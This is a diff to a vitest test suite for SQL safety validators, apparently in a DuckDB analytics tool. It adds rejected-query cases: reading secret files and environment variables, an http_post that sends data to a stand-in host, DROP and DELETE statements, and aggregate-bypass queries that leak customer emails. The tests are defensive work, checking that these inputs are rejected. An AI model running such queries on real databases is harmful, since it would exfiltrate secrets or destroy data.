@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import {
+  assertAggregateOnlyQuery,
   assertReadOnlyQuery,
   assertSafeMeasureExpression,
   compileFilterPredicate,
@@ -19,6 +20,11 @@ describe('SQL safety', () => {
     'DELETE FROM sales',
     'SELECT 1; DROP TABLE sales',
     "SELECT * FROM read_csv('secret.csv')",
+    "SELECT * FROM \"read_csv\"('secret.csv')",
+    "SELECT * FROM parquet_scan('secret.parquet')",
+    "SELECT getenv('USERPROFILE')",
+    "SELECT http_post('https://example.invalid', 'secret')",
+    'SELECT * FROM duckdb_databases()',
     "SELECT * FROM 'secret.parquet'",
     'WITH changed AS (UPDATE sales SET amount = 0 RETURNING *) SELECT * FROM changed',
     'SELECT * FROM query_table(\'sales\')'
@@ -34,6 +40,18 @@ describe('SQL safety', () => {
   it('validates scalar measure expressions', () => {
     expect(assertSafeMeasureExpression('SUM("amount") FILTER (WHERE "active")')).toContain('SUM');
     expect(() => assertSafeMeasureExpression('(SELECT SUM(amount) FROM sales)')).toThrow();
+    expect(() => assertSafeMeasureExpression("http_post('https://example.invalid', MAX(amount))")).toThrow();
+  });
+
+  it('allows bounded aggregate shapes and rejects raw-row aggregate bypasses', () => {
+    expect(assertAggregateOnlyQuery('SELECT region, SUM(amount) AS revenue FROM sales GROUP BY region'))
+      .toContain('SUM');
+    expect(assertAggregateOnlyQuery('SELECT ROUND(AVG(amount), 2) AS average FROM sales'))
+      .toContain('ROUND');
+    expect(() => assertAggregateOnlyQuery('SELECT email, COUNT(*) OVER () FROM customers')).toThrow(/Window queries/);
+    expect(() => assertAggregateOnlyQuery('SELECT ANY_VALUE(email), COUNT(*) FROM customers')).toThrow(/any_value/);
+    expect(() => assertAggregateOnlyQuery('SELECT COUNT(*) AS xfrom, ANY_VALUE(email) FROM customers')).toThrow(/any_value/);
+    expect(() => assertAggregateOnlyQuery('WITH totals AS (SELECT COUNT(*) FROM sales) SELECT * FROM totals')).toThrow(/direct SELECT/);
   });
 });
 
